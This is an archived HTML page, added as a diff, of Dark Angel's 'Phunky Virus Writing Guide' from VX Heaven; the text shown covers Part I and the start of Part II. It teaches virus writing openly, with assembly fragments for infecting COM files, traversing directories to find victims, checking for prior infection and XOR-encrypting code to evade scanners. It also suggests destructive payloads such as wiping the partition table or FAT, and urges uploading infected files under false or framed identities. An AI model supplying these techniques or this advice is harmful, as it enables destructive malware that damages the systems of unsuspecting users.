@@ -1,0 +1,1275 @@
+<?xml version="1.0"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+<title> Dark Angel 'Phunky Virus Writing Guide' (VX heaven)</title>
+<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
+<meta name="Author" content="Dark Angel"/>
+<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, Dark Angel,Phunky Virus Writing Guide, interrupt, handler, resident, file, memory, encryption, virus, encrypt, part, holds, handle, word, variable, high, start"/>
+<meta name="Description" content="This guide will show you what it takes to write a virus and also will give you a plethora of source code to include in your own virii."/>
+<script type="text/javascript">
+//<![CDATA[
+try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"088e37d1c658d0480292bcad6722be0b61c7c37a-1498756954-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
+//]]>
+</script>
+<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vda07.html"/>
+<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
+</head>
+<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
+<div class="s1">
+<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
+<div style="float: right;"><div id="plusone"></div></div>
+<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
+<div style="float: right;" class="addthis_toolbox addthis_default_style">
+<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
+<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
+<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
+</div>
+<div style="float: right;">
+<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
+<form action="/search.php" id="cse-search-box">
+<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
+<input type="hidden" name="cof" value="FORID:10"/>
+<input type="hidden" name="ie" value="UTF-8"/>
+<input type="text" name="q" size="12" value=" "/>
+<input type="submit" name="sa" value="Search"/>
+</form>
+</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
+<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
+</div>
+<div class="s2"><h1>Phunky Virus Writing Guide</h1><p><a href="/lib/?lang=en&amp;author=Dark%20Angel"> Dark Angel</a><br/></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vda07.html';</script><div class="ci"><a href="/lib/?ci=vda07">2</a></div>[<a style="" href="/lib/?lang=EN&amp;index=DO#vda07">Back to index</a>] [<a href="/lib/vda07.html#disqus_thread">Comments</a>]<br/> 
+<ul>
+<li>Part I
+<ul>
+<li><a href="#p11">THE REPLICATOR</a></li>
+<li><a href="#p12">CONCEALER</a></li>
+<li><a href="#p13">THE BOMB</a></li>
+<li><a href="#p14">OFFSET PROBLEMS</a></li>
+<li><a href="#p15">TESTING</a></li>
+<li><a href="#p16">DISTRIBUTION</a></li>
+<li><a href="#p17">OVERWRITING VIRII</a></li>
+<li><a href="#p18">WELL, THAT JUST ABOUT...</a></li>
+</ul></li>
+<li>Part II
+<ul>
+<li><a href="#p21">INSTALLMENT II: THE REPLICATOR</a></li>
+<li><a href="#p22">STEP 1 - FIND A FILE TO INFECT</a></li>
+<li><a href="#p23">STEP 2 - CHECK VERSUS INFECTION CRITERIA</a></li>
+<li><a href="#p24">STEP 3 - CHECK FOR PREVIOUS INFECTION</a></li>
+<li><a href="#p25">STEP 4 - INFECT THE FILE</a></li>
+<li><a href="#p26">STEP 5 - COVER YOUR TRACKS</a></li>
+<li><a href="#p27">WHAT'S TO COME</a></li>
+</ul></li>
+<li>Part III
+<ul>
+<li><a href="#p31">INSTALLMENT III: NONRESIDENT VIRII, PART II</a></li>
+<li><a href="#p32">THE CONCEALER</a></li>
+<li><a href="#p33">THE DISPATCHER</a></li>
+<li><a href="#p34">THE BOMB</a></li>
+<li><a href="#p35">MEA CULPA</a></li>
+<li><a href="#p36">TIPS AND TRICKS</a></li>
+<li><a href="#p37">SO NOW</a></li>
+</ul></li>
+<li>Part IV
+<ul>
+<li><a href="#p41">INSTALLMENT IV: RESIDENT VIRII, PART I</a></li>
+<li><a href="#p42">INTERRUPTS</a></li>
+<li><a href="#p43">AN INTRODUCTION TO DOS MEMORY ALLOCATION</a></li>
+<li><a href="#p44">METHODS OF GOING RESIDENT</a></li>
+<li><a href="#p45">WHY RESIDENT?</a></li>
+<li><a href="#p46">STRUCTURE OF THE RESIDENT VIRUS</a></li>
+<li><a href="#p47">WHAT'S TO COME</a></li>
+</ul></li>
+<li>Part V
+<ul>
+<li><a href="#p51">INSTALLMENT V: RESIDENT VIRUSES, PART II</a></li>
+<li><a href="#p52">STRUCTURE</a></li>
+<li><a href="#p53">LOADING STUB</a></li>
+<li><a href="#p54">INSTALLATION CHECK</a></li>
+<li><a href="#p55">FIND THE TOP OF MEMORY</a></li>
+<li><a href="#p56">ALLOCATE THE HIGH MEMORY</a></li>
+<li><a href="#p57">COPY THE VIRUS TO HIGH MEMORY</a></li>
+<li><a href="#p58">SWAP INTERRUPT VECTORS</a></li>
+<li><a href="#p59">INTERRUPT HANDLER</a></li>
+<li><a href="#p5a">A THEORY ON RESIDENT VIRUSES</a></li>
+<li><a href="#p5b">IF YOU DON'T UNDERSTAND IT YET</a></li>
+</ul></li>
+</ul>
+<p>Virii are wondrous creations written for the sole purpose of spreading and destroying the systems of unsuspecting fools. This eliminates the systems of simpletons who can't tell that there is a problem when a 100 byte file suddenly blossoms into a 1,000 byte file. Duh. These low-lifes do not deserve to exist, so it is our sacred duty to wipe their hard drives off the face of the Earth. It is a simple matter of speeding along survival of the fittest.</p>
+<p>Why did I create this guide? After writing several virii, I have noticed that virus writers generally learn how to write virii either on their own or by examining the disassembled code of other virii. There is an incredible lack of information on the subject. Even books published by morons such as Burger are, at best, sketchy on how to create a virus. This guide will show you what it takes to write a virus and also will give you a plethora of source code to include in your own virii.</p>
+<p>Virus writing is not as hard as you might first imagine. To write an effective virus, however, you *must* know assembly language. Short, compact code are hallmarks of assembly language and these are desirable characteristics of virii. However, it is *not* necessary to write in pure assembly. C may also be used, as it allows almost total control of the system while generating relatively compact code (if you stay away from the library functions). However, you still must access the interrupts, so assembly knowledge is still required. However, it is still best to stick with pure assembly, since most operations are more easily coded in assembly. If you do not know assembly, I would recommend picking up a copy of The Microsoft Macro Assembler Bible (Nabajyoti Barkakati, ISBN #: 0-672-22659-6). It is an easy-to-follow book covering assembly in great detail. Also get yourself a copy of Undocumented DOS (Schulman, et al, ISBN #0-201-57064-5), as it is very helpful.</p>
+<p>The question of which compiler to use arises often. I suggest using Borland Turbo Assembler and/or Borland C++. I do not have a copy of Zortech C (it was too large to download), but I would suspect that it is also a good choice. Stay away from Microsoft compilers, as they are not as flexible nor as efficient as those of other vendors.</p>
+<p>A few more items round out the list of tools helpful in constructing virii. The latest version of Norton Utilities is one of the most powerful programs available, and is immeasurably helpful. MAKE SURE YOU HAVE A COPY! You can find it on any decent board. It can be used during every step of the process, from the writing to the testing. A good debugger helps. Memory management utilities such as MAPMEM, PMAP, and MARK/RELEASE, are invaluable, especially when coding TSR virii. Sourcer, the commenting disassembler, is useful when you wish to examine the code of other virii (this is a good place to get ideas/techniques for your virus).</p>
+<p>Now that you have your tools, you are ready to create a work of art designed to smash the systems of cretins. There are three types of virii:</p>
+<ol>
+<li>Tiny virii (under 500 bytes) which are designed to be undetectable due to their small size. TINY is one such virus. They are generally very simple because their code length is so limited.</li>
+<li>Large virii (over 1,500 bytes) which are designed to be undetectable because they cover their tracks very well (all that code DOES have a use!). The best example of this is the Whale virus, which is perhaps the best 'stealth' virus in existence.</li>
+<li>Other virii which are not designed to be hidden at all (the writers don't give a shit). The common virus is like this. All overwriting virii are in this category.</li>
+</ol>
+<p>You must decide which kind of virus you wish to write. I will mostly be discussing the second type (stealth virii). However, many of the techniques discribed may be easily applied to the first type (tiny virii). However, tiny virii generally do not have many of the "features" of larger virii, such as directory traversal. The third type is more of a replicating trojan-type, and will warrant a brief (very, very brief!) discussion later.</p>
+<p>A virus may be divided into three parts: the replicator, the concealer, and the bomb. The replicator part controls the spread of the virus to other files, the concealer keeps the virus from being detected, and the bomb only executes when the activation conditions of the virus (more on that later) are satisfied.</p>
+<h2><a name="p11">THE REPLICATOR</a></h2>
+<p>The job of the replicator is to spread the virus throughout the system of the clod who has caught the virus. How does it do this without destroying the file it infects? The easiest type of replicator infects COM files. It first saves the first few bytes of the infected file. It then copies a small portion of its code to the beginning of the file, and the rest to the end.</p>
+<pre>    
+     +----------------+      +------------+
+     | P1 | P2        |      | V1 | V2    |
+     +----------------+      +------------+
+    The uninfected file     The virus code
+</pre>
+<p>In the diagram, P1 is part 1 of the file, P2 is part 2 of the file, and V1 and V2 are parts 1 and 2 of the virus. Note that the size of P1 should be the same as the size of V1, but the size of P2 doesn't necessarily have to be the same size as V2. The virus first saves P1 and copies it to the either 1) the end of the file or 2) inside the code of the virus. Let's assume it copies the code to the end of the file. The file now looks like:</p>
+<pre>    
+     +---------------------+
+     | P1 | P2        | P1 |
+     +---------------------+
+</pre>
+<p>Then, the virus copies the first part of itself to the beginning of the file.</p>
+<pre>    
+     +---------------------+
+     | V1 | P2        | P1 |
+     +---------------------+
+</pre>
+<p>Finally, the virus copies the second part of itself to the end of the file. The final, infected file looks like this:</p>
+<pre>    
+     +-----------------------------+
+     | V1 | P2        | P1 | V2    |
+     +-----------------------------+
+</pre>
+<p>The question is: What the fuck do V1 and V2 do? V1 transfers control of the program to V2. The code to do this is simple.</p>
+<pre class="source">    
+        JMP FAR PTR Duh       ; Takes four bytes
+   Duh  DW  V2_Start          ; Takes two bytes
+</pre>
+<p>Duh is a far pointer (Segment:Offset) pointing to the first instruction of V2. Note that the value of Duh must be changed to reflect the length of the file that is infected. For example, if the original size of the program is 79 bytes, Duh must be changed so that the instruction at CS:[155h] is executed. The value of Duh is obtained by adding the length of V1, the original size of the infected file, and 256 (to account for the PSP). In this case, V1 = 6 and P1 + P2 = 79, so 6 + 79 + 256 = 341 decimal (155 hex).</p>
+<p>An alternate, albeit more difficult to understand, method follows:</p>
+<pre class="source">
+        DB 1101001b              ; Code for JMP (2 byte-displacement)
+   Duh  DW V2_Start - OFFSET Duh ; 2 byte displacement
+</pre>
+<p>This inserts the jump offset directly into the code following the jump instruction. You could also replace the second line with</p>
+<pre class="source">
+        DW V2_Start - $
+</pre>
+<p>which accomplishes the same task.</p>
+<p>V2 contains the rest of the code, i.e. the stuff that does everything else. The last part of V2 copies P1 over V1 (in memory, not on disk) and then transfers control to the beginning of the file (in memory). The original program will then run happily as if nothing happened. The code to do this is also very simple.</p>
+<pre class="source">
+        MOV SI, V2_START      ; V2_START is a LABEL marking where V2 starts
+        SUB SI, V1_LENGTH     ; Go back to where P1 is stored
+        MOV DI, 0100h         ; All COM files are loaded @ CS:[100h] in memory
+        MOV CX, V1_LENGTH     ; Move CX bytes
+        REP MOVSB             ; DS:[SI] -> ES:[DI]
+    
+        MOV DI, 0100h
+        JMP DI
+</pre>
+<p>This code assumes that P1 is located just before V2, as in:</p>
+<pre class="source">
+   P1_Stored_Here:
+        .
+        .
+        .
+   V2_Start:
+</pre>
+<p>It also assumes ES equals CS. If these assumptions are false, change the code accordingly. Here is an example:</p>
+<pre class="source">
+        PUSH CS               ; Store CS
+        POP  ES               ;  and move it to ES
+                              ; Note MOV ES, CS is not a valid instruction
+        MOV SI, P1_START      ; Move from whereever P1 is stored
+        MOV DI, 0100h         ;  to CS:[100h]
+        MOV CX, V1_LENGTH
+        REP MOVSB
+    
+        MOV DI, 0100h
+        JMP DI
+</pre>
+<p>This code first moves CS into ES and then sets the source pointer of MOVSB to where P1 is located. Remember that this is all taking place in memory, so you need the OFFSET of P1, not just the physical location in the file. The offset of P1 is 100h higher than the physical file location, as COM files are loaded starting from CS:[100h].</p>
+<p>So here's a summary of the parts of the virus and location labels:</p>
+<pre class="source">
+   V1_Start:
+        JMP FAR PTR Duh
+   Duh  DW  V2_Start
+   V1_End:
+    
+   P2_Start:
+   P2_End:
+    
+   P1_Start:
+     ; First part of the program stored here for future use
+   P1_End:
+    
+   V2_Start:
+     ; Real Stuff
+   V2_End:
+    
+   V1_Length EQU V1_End - V1_Start
+    
+   Alternatively, you could store P1 in V2 as follows:
+    
+   V2_Start:
+    
+   P1_Start:
+   P1_End:
+    
+   V2_End:
+</pre>
+<p>That's all there is to infecting a COM file without destroying it! Simple, no? EXE files, however, are a little tougher to infect without rendering them inexecutable - I will cover this topic in a later file.</p>
+<p>Now let us turn our attention back to the replicator portion of the virus. The steps are outlined below:</p>
+<ol>
+<li>Find a file to infect</li>
+<li>Check if it is already infected</li>
+<li>If so, go back to 1</li>
+<li>Infect it</li>
+<li>If infected enough, quit</li>
+<li>Otherwise, go back to 1</li>
+</ol>
+<p>Finding a file to infect is a simple matter of writing a directory traversal procedure and issuing FINDFIRST and FINDNEXT calls to find possible files to infect. Once you find the file, open it and read the first few bytes. If they are the same as the first few bytes of V1, then the file is already infected. If the first bytes of V1 are not unique to your virus, change it so that they are. It is *extremely* important that your virus doesn't reinfect the same files, since that was how Jerusalem was first detected. If the file wasn't already infected, then infect it! Infection should take the following steps:</p>
+<ol>
+<li>Change the file attributes to nothing.</li>
+<li>Save the file date/time stamps.</li>
+<li>Close the file.</li>
+<li>Open it again in read/write mode.</li>
+<li>Save P1 and append it to the end of the file.</li>
+<li>Copy V1 to the beginning, but change the offset which it JMPs to so it transfers control correctly. See the previous part on infection.</li>
+<li>Append V2 to the end of the file.</li>
+<li>Restore file attributes/date/time.</li>
+</ol>
+<p>You should keep a counter of the number of files infected during this run. If the number exceeds, say three, then stop. It is better to infect slowly then to give yourself away by infecting the entire drive at once.</p>
+<p>You must be sure to cover your tracks when you infect a file. Save the file's original date/time/attributes and restore them when you are finished. THIS IS VERY IMPORTANT! It takes about 50 to 75 bytes of code, probably less, to do these few simple things which can do wonders for the concealment of your program.</p>
+<p>I will include code for the directory traversal function, as well as other parts of the replicator in the next installment of my phunky guide.</p>
+<h2><a name="p12">CONCEALER</a></h2>
+<p>This is the part which conceals the program from notice by the everyday user and virus scanner. The simplest form of concealment is the encryptor. The code for a simple XOR encryption system follows:</p>
+<pre class="source">
+   encrypt_val   db   ?
+    
+   decrypt:
+   encrypt:
+        mov ah, encrypt_val
+    
+        mov cx, part_to_encrypt_end - part_to_encrypt_start
+        mov si, part_to_encrypt_start
+        mov di, si
+    
+   xor_loop:
+        lodsb                 ; DS:[SI] -> AL
+        xor al, ah
+        stosb                 ; AL -> ES:[DI]
+        loop xor_loop
+        ret
+</pre>
+<p>Note the encryption and decryption procedures are the same. This is due to the weird nature of XOR. You can CALL these procedures from anywhere in the program, but make sure you do not call it from a place within the area to be encrypted, as the program will crash. When writing the virus, set the encryption value to 0. part_to_encrypt_start and part_to_encrypt_end sandwich the area you wish to encrypt. Use a CALL decrypt in the beginning of V2 to unencrypt the file so your program can run. When infecting a file, first change the encrypt_val, then CALL encrypt, then write V2 to the end of the file, and CALL decrypt. MAKE SURE THIS PART DOES NOT LIE IN THE AREA TO BE ENCRYPTED!!!</p>
+<p>This is how V2 would look with the concealer:</p>
+<pre class="source">
+   V2_Start:
+    
+   Concealer_Start:
+     .
+     .
+     .
+   Concealer_End:
+    
+   Replicator_Start:
+     .
+     .
+     .
+   Replicator_End:
+    
+   Part_To_Encrypt_Start:
+     .
+     .
+     .
+   Part_To_Encrypt_End:
+   V2_End:
+</pre>
+<p>Alternatively, you could move parts of the unencrypted stuff between Part_To_Encrypt_End and V2_End.</p>
+<p>The value of encryption is readily apparent. encryption makes it harder for virus scanners to locate your virus. It also hides some text strings located in your program. It is the easiest and shortest way to hide your virus.</p>
+<p>encryption is only one form of concealment. At least one other virus hooks into the DOS interrupts and alters the output of DIR so the file sizes appear normal. Another concealment scheme (for TSR virii) alters DOS so memory utilities do not detect the virus. Loading the virus in certain parts of memory allow it to survive warm reboots. There are many stealth techniques, limited only by the virus writer's imagination.</p>
+<h2><a name="p13">THE BOMB</a></h2>
+<p>So now all the boring stuff is over. The nastiness is contained here. The bomb part of the virus does all the deletion/slowdown/etc which make virii so annoying. Set some activation conditions of the virus. This can be anything, ranging from when it's your birthday to when the virus has infected 100 files. When these conditions are met, then your virus does the good stuff. Some suggestions of possible bombs:</p>
+<ol>
+<li>System slowdown - easily handled by trapping an interrupt and causing a delay when it activates.</li>
+<li>File deletion - Delete all ZIP files on the drive.</li>
+<li>Message display - Display a nice message saying something to the effect of "You are fucked."</li>
+<li>Killing/Replacing the Partition Table/Boot Sector/FAT of the hard drive - This is very nasty, as most dimwits cannot fix this.</li>
+</ol>
+<p>This is, of course, the fun part of writing a virus, so be original!</p>
+<h2><a name="p14">OFFSET PROBLEMS</a></h2>
+<p>There is one caveat regarding calculation of offsets. After you infect a file, the locations of variables change. You MUST account for this. All relative offsets can stay the same, but you must add the file size to the absolute offsets or your program will not work. This is the most tricky part of writing virii and taking these into account can often greatly increase the size of a virus. THIS IS VERY IMPORTANT AND YOU SHOULD BE SURE TO UNDERSTAND THIS BEFORE ATTEMPTING TO WRITE A NONOVERWRITING VIRUS! If you don't, you'll get fucked over and your virus WILL NOT WORK! One entire part of the guide will be devoted to this subject.</p>
+<h2><a name="p15">TESTING</a></h2>
+<p>Testing virii is a dangerous yet essential part of the virus creation process. This is to make certain that people *will* be hit by the virus and, hopefully, wiped out. Test thoroughly and make sure it activates under the conditions. It would be great if everyone had a second computer to test their virii out, but, of course, this is not the case. So it is ESSENTIAL that you keep BACKUPS of your files, partition, boot record, and FAT. Norton is handy in this doing this. Do NOT disregard this advice (even though I know that you will anyway) because you WILL be hit by your own virii. When I wrote my first virus, my system was taken down for two days because I didn't have good backups. Luckily, the virus was not overly destructive. BACKUPS MAKE SENSE! LEECH A BACKUP PROGRAM FROM YOUR LOCAL PIRATE BOARD! I find a RamDrive is often helpful in testing virii, as the damage is not permanent. RamDrives are also useful for testing trojans, but that is the topic of another file...</p>
+<h2><a name="p16">DISTRIBUTION</a></h2>
+<p>This is another fun part of virus writing. It involves sending your brilliantly-written program through the phone lines to your local, unsuspecting bulletin boards. What you should do is infect a file that actually does something (leech a useful utility from another board), infect it, and upload it to a place where it will be downloaded by users all over. The best thing is that it won't be detected by puny scanner-wanna-bes by McAffee, since it is new! Oh yeah, make sure you are using a false account (duh). Better yet, make a false account with the name/phone number of someone you don't like and upload the infected file under the his name. You can call back from time to time and use a door such as ZDoor to check the spread of the virus. The more who download, the more who share in the experience of your virus!</p>
+<p>I promised a brief section on overwriting virii, so here it is...</p>
+<h2><a name="p17">OVERWRITING VIRII</a></h2>
+<p>All these virii do is spread throughout the system. They render the infected files inexecutable, so they are easily detected. It is simple to write one:</p>
+<pre>    
+      +-------------+   +-----+   +-------------+
+      | Program     | + |Virus| = |Virus|am     |
+      +-------------+   +-----+   +-------------+
+</pre>
+<p>These virii are simple little hacks, but pretty worthless because of their easy detectability. Enuff said!</p>
+<h2><a name="p18">WELL, THAT JUST ABOUT...</a></h2>
+<p>wraps it up for this installment of Dark Angel's Phunky virus writing guide. There will (hopefully) be future issues where I discuss more about virii and include much more source code (mo' source!). Till then, happy coding!</p>
+<h2>Part II</h2>
+<h2><a name="p21">INSTALLMENT II: THE REPLICATOR</a></h2>
+<p>In the last installment of my Virus Writing Guide, I explained the various parts of a virus and went into a brief discussion about each. In this issue, I shall devote all my attention towards the replicator portion of the virus. I promised code and code I shall present.</p>
+<p>However, I shall digress for a moment because it has come to my attention that some mutant copies of the first installment were inadvertently released. These copies did not contain a vital section concerning the calculation of offsets.</p>
+<p>You never know where your variables and code are going to wind up in memory. If you think a bit, this should be pretty obvious. Since you are attaching the virus to the end of a program, the location in memory is going to be changed, i.e. it will be larger by the size of the infected program. So, to compensate, we must take the change in offset from the original virus, or the delta offset, and add that to all references to variables.</p>
+<p>Instructions that use displacement, i.e. relative offsets, need not be changed. These instructions are the JA, JB, JZ class of instructions, JMP SHORT, JMP label, and CALL. Thus, whenever possible use these in favor of, say, JMP FAR PTR.</p>
+<p>Suppose in the following examples, si is somehow loaded with the delta offset.</p>
+<pre class="source"> 
+  Replace
+    mov ax, counter
+  With
+    mov ax, word ptr [si+offset counter]
+ 
+  Replace
+    mov dx, offset message
+  With
+    lea dx, [si+offset message]
+</pre>
+<p>You may be asking, "how the farg am I supposed to find the delta offset!?" It is simple enough:</p>
+<pre class="source"> 
+    call setup
+  setup:
+    pop  si
+    sub  si, offset setup
+</pre>
+<p>An explanation of the above fragment is in order. CALL setup pushes the location of the next instruction, i.e. offset setup, onto the stack. Next, this location is POPed into si. Finally, the ORIGINAL offset of setup (calculated at compile-time) is subtracted from si, giving you the delta offset. In the original virus, the delta offset will be 0, i.e. the new location of setup equals the old location of setup.</p>
+<p>It is often preferable to use bp as your delta offset, since si is used in string instructions. Use whichever you like. I'll randomly switch between the two as suits my mood.</p>
+<p>Now back to the other stuff...</p>
+<p>A biological virus is a parasitic "organism" which uses its host to spread itself. It must keep the host alive to keep itself "alive." Only when it has spread everywhere will the host die a painful, horrible death. The modern electronic virus is no different. It attaches itself to a host system and reproduces until the entire system is fucked. It then proceeds and neatly wrecks the system of the dimwit who caught the virus.</p>
+<p>Replication is what distinguishes a virus from a simple trojan. Anybody can write a trojan, but a virus is much more elegant. It acts almost invisibly, and catches the victim off-guard when it finally surfaces. The first question is, of course, how does a virus spread? Both COM and EXE infections (along with sample infection routines) shall be presented.</p>
+<p>There are two major approaches to virii: runtime and TSR. Runtime virii infect, yup, you guessed it, when the infected program is run, while TSR virii go resident when the infected programs are run and hook the interrupts and infect when a file is run, open, closed, and/or upon termination (i.e. INT 20h, INT 21h/41h). There are advantages and disadvantages to each. Runtime virii are harder to detect as they don't show up on memory maps, but, on the other hand, the delay while it searches for and infects a file may give it away. TSR virii, if not properly done, can be easily spotted by utilities such as MAPMEM, PMAP, etc, but are, in general, smaller since they don't need a function to search for files to infect. They are also faster than runtime virii, also because they don't have to search for files to infect. I shall cover runtime virii here, and TSR virii in a later installment.</p>
+<p>Here is a summary of the infection procedure:</p>
+<ol>
+<li>Find a file to infect.</li>
+<li>Check if it meets the infection criteria.</li>
+<li>See if it is already infected and if so, go back to 1.</li>
+<li>Otherwise, infect the file.</li>
+<li>Cover your tracks.</li>
+</ol>
+<p>I shall go through each of these steps and present sample code for each. Note that although a complete virus can be built from the information below, you cannot merely rip the code out and stick it together, as the fragments are from various different virii that I have written. You must be somewhat familiar with assembly. I present code fragments; it is up to you to either use them as examples or modify them for your own virii.</p>
+<h2><a name="p22">STEP 1 - FIND A FILE TO INFECT</a></h2>
+<p>Before you can infect a file, you have to find it first! This can be a bottleneck in the performance of the virus, so it should be done as efficiently as possible. For runtime virii, there are a few possibilities. You could infect files in only the current directory, or you could write a directory traversal function to infect files in ALL directories (only a few files per run, of course), or you could infect files in only a few select directories. Why would you choose to only infect files in the current directory? It would appear to limit the efficacy of the infections. However, this is done in some virii either to speed up the virus or to shorten the code size.</p>
+<p>Here is a directory traversal function. It uses recursion, so it is rather slow, but it does the job. This was excerpted with some modifications from The Funky Bob Ross Virus [Beta].</p>
+<pre class="source"> 
+  traverse_fcn proc    near
+          push    bp                      ; Create stack frame
+          mov     bp,sp
+          sub     sp,44                   ; Allocate space for DTA
+ 
+          call    infect_directory        ; Go to search &amp; destroy routines
+ 
+          mov     ah,1Ah                  ;Set DTA
+          lea     dx,word ptr [bp-44]     ; to space allotted
+          int     21h                     ;Do it now!
+ 
+          mov     ah, 4Eh                 ;Find first
+          mov     cx,16                   ;Directory mask
+          lea     dx,[si+offset dir_mask] ; *.*
+          int     21h
+          jmp     short isdirok
+  gonow:
+          cmp     byte ptr [bp-14], '.'   ; Is first char == '.'?
+          je      short donext            ; If so, loop again
+          lea     dx,word ptr [bp-14]     ; else load dirname
+          mov     ah,3Bh                  ; and changedir there
+          int     21h
+          jc      short donext              ; Do next if invalid
+          inc     word ptr [si+offset nest] ; nest++
+          call    near ptr traverse_fcn     ; recurse directory
+  donext:
+          lea     dx,word ptr [bp-44]     ; Load space allocated for DTA
+          mov     ah,1Ah                  ; and set DTA to this new area
+          int     21h                     ; 'cause it might have changed
+ 
+          mov     ah,4Fh                  ;Find next
+          int     21h
+  isdirok:
+          jnc     gonow                   ; If OK, jmp elsewhere
+          cmp     word ptr [si+offset nest], 0 ; If root directory
+                                               ;  (nest == 0)
+          jle     short cleanup                ; then Quit
+          dec     word ptr [si+offset nest]    ; Else decrement nest
+          lea     dx, [si+offset back_dir]; '..'
+          mov     ah,3Bh                  ; Change directory
+          int     21h                     ; to previous one
+  cleanup:
+          mov     sp,bp
+          pop     bp
+          ret
+  traverse_fcn endp
+ 
+  ; Variables
+  nest     dw     0
+  back_dir db     '..',0
+  dir_mask db     '*.*',0
+</pre>
+<p>The code is self-explanatory. Make sure you have a function called infect_directory which scans the directory for possible files to infect and makes sure it doesn't infect already-infected files. This function, in turn, calls infect_file which infects the file.</p>
+<p>Note, as I said before, this is slow. A quicker method, albeit not as global, is the "dot dot" method. Hellraiser showed me this neat little trick. Basically, you keep searching each directory and, if you haven't infected enough, go to the previous directory (dot dot) and try again, and so on. The code is simple.</p>
+<pre class="source">
+  dir_loopy:
+          call    infect_directory
+          lea     dx, [bp+dotdot]
+          mov     ah, 3bh                 ; CHDIR
+          int     21h
+          jnc     dir_loopy               ; Carry set if in root
+ 
+  ; Variables
+  dotdot  db      '..',0
+</pre>
+<p>Now you must find a file to infect. This is done (in the fragments above) by a function called infect_directory. This function calls FINDFIRST and FINDNEXT a couple of times to find files to infect. You should first set up a new DTA. NEVER use the DTA in the PSP (at 80h) because altering that will affect the command-line parameters of the infected program when control is returned to it. This is easily done with the following:</p>
+<pre class="source">
+          mov     ah, 1Ah                 ; Set DTA
+          lea     dx, [bp+offset DTA]     ; to variable called DTA (wow!)
+          int     21h
+</pre>
+<p>Where DTA is a 42-byte chunk of memory. Next, issue a series of FINDFIRST and FINDNEXT calls:</p>
+<pre class="source">
+          mov     ah, 4Eh                 ; Find first file
+          mov     cx, 0007h               ; Any file attribute
+          lea    dx, [bp+offset file_mask]; DS:[DX] --> filemask
+          int     21h
+          jc      none_found
+  found_another:
+          call    check_infection
+          mov     ah, 4Fh                 ; Find next file
+          int     21h
+          jnc     found_another
+  none_found:
+</pre>
+<p>Where file_mask is DBed to either '*.EXE',0 or '*.COM',0. Alternatively, you could FINDFIRST for '*.*',0 and check if the extension is EXE or COM.</p>
+<h2><a name="p23">STEP 2 - CHECK VERSUS INFECTION CRITERIA</a></h2>
+<p>Your virus should be judicious in its infection. For example, you might not want to infect COMMAND.COM, since some programs (i.e. the puny FluShot+) check its CRC or checksum on runtime. Perhaps you do not wish to infect the first valid file in the directory. Ambulance Car is an example of such a virus. Regardless, if there is some infection criteria, you should check for it now. Here's example code checking if the last two letters are 'ND', a simple check for COMMAND.COM:</p>
+<pre class="source">
+          cmp     word ptr [bp+offset DTA+35], 'DN'  ; Reverse word order
+          jz      fail_check
+</pre>
+<h2><a name="p24">STEP 3 - CHECK FOR PREVIOUS INFECTION</a></h2>
+<p>Every virus has certain characteristics with which you can identify whether a file is infected already. For example, a certain piece of code may always occur in a predictable place. Or perhaps the JMP instruction is always coded in the same manner. Regardless, you should make sure your virus has a marker so that multiple infections of the same file do not occur. Here's an example of one such check (for a COM file infector):</p>
+<pre class="source">
+          mov     ah,3Fh                          ; Read first three
+          mov     cx, 3                           ; bytes of the file
+          lea     dx, [bp+offset buffer]          ; to the buffer
+          int     21h
+ 
+          mov     ax, 4202h                       ; SEEK from EOF
+          xor     cx, cx                          ; DX:CX = offset
+          xor     dx, dx                          ; Returns filesize
+          int     21h                             ; in DX:AX
+ 
+          sub     ax, virus_size + 3
+          cmp     word ptr [bp+offset buffer+1], ax
+          jnz     infect_it
+ 
+  bomb_out:
+          mov     ah, 3Eh                         ; else close the file
+          int     21h                             ;  and go find another
+</pre>
